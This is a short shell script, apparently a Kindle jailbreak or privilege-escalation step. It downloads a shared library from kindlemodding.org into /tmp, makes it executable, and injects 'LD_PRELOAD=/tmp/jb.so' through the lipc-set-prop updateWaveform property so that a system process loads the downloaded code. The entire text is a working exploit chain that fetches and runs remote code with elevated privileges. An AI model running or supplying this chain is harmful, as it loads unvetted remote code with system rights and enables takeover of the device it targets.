#!/bin/sh
curl -o /tmp/jb.so https://kindlemodding.org/vera/aprivesc/jb.so
chmod +x /tmp/jb.so
lipc-set-prop com.lab126.system updateWaveform LD_PRELOAD=/tmp/jb.so
